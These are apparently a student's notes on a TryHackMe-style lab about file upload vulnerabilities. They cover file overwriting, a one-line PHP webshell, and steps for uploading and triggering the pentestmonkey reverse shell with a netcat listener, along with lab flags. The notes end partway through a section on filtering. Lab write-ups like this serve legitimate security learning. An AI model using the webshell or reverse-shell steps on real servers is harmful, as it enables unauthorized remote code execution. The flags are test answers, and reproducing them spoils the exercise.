# Upload Vulnerabilities


## Intro
- If not handled well, file uploads can result in full Remote Code Execution (RCE), webpage injection, and XSS or CSRF vulnerabilities
- If users are allowed to upload arbitrary files they can use the server to host illegal content or leak sensitive information


## General Methodology
- Enumeration is key
- Look at source code, scan with a directory bruteforcer like gobuster, intercept web requests with burpsuite, and check out browser extensions like wappalyser
- If client-side filtering is used for the upload then we can easily see the code and bypass it
- If server-side filtering is being used we need to experiment by uploading files
    - Burpsuite or OWASP Zap are helpful here


## Overwriting Existing Files
- When files are uplaoded, a range of checks should be performed to ensure that the file doesn't overwrite an already existing file
- Common practice is assigning a random name or with the data and time of uplaod added to the start or end of the original filename
- File permissions should be in place to prevent overwriting
### Overwriting the file
1. Go to the website, right click, and view page source
2. `<img src="images/mountains.jpg" alt="">` We see that the name of the image is "mountains.jpg'
3. Now we download an image, name it mountains.jpg, and upload the file
4. The flag we get is THM{OTBiODQ3YmNjYWZhM2UyMmYzZDNiZjI5}


## Remote Code Execution (RCE)
- Allows us to execute code arbitratily on the web server
- Result of uploading a program written in the same language as the back-end of the website (or another language that the server understands and will execute)
    - Traditionally the language is php, but other now other back-end languages have become more common: Python Django and Javascript in Node.js
- 2 ways to achieve RCE: webshells and reverse shells
    - A fully featured reverse shell is ideal goal, but webshell may be the only option available
- General methodology: Upload a shell, activate it by nagivating to the file on the server or force the webapp to run it for us
- Simple php webshell
><?php
>    echo system($_GET["cmd"]);
>?>
### Reverse Shell
1. Use gobuster to find hidden directories `gobuster -w /usr/share/wordlists/dirb/common.txt -u http://shell.uploadvulns.thm`, /resources is probably used to store uploaded files
>root@ip-10-10-154-247:~# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://shell.uploadvulns.thm
>===============================================================
>Gobuster v3.0.1
>by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
>===============================================================
>[+] Url:            http://shell.uploadvulns.thm
>[+] Threads:        10
>[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
>[+] Status codes:   200,204,301,302,307,401,403
>[+] User Agent:     gobuster/3.0.1
>[+] Timeout:        10s
>===============================================================
>2021/11/27 01:57:10 Starting gobuster
>===============================================================
>/.htaccess (Status: 403)
>/.hta (Status: 403)
>/.htpasswd (Status: 403)
>/assets (Status: 301)
>/favicon.ico (Status: 200)
>/index.php (Status: 200)
>/resources (Status: 301)
>/server-status (Status: 403)
>===============================================================
>2021/11/27 01:57:13 Finished
>===============================================================

2. Edit the ip address and port on the [Monkey Pentest Reverse Shell script](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and upload it to the server
3. Start a netcat listener on the port specified in the script `nc -nvlp 6000`
4. Launch the script with `curl http://shell.uploadvulns.thm/resources/scriptName`
5. Go to the /var/www directory and cat the flag.txt file to find THM{YWFhY2U3ZGI4N2QxNmQzZjk0YjgzZDZk}


## Filtering
- Client Side Filtering
    - It's running on the user's browser, and is easy to bypass because user can manipulate code
- Server Side Filtering
    - More difficult to bypass because it's running on server, in most cases is impossible to bypass entirely
### Filtering Types
- Extension validation
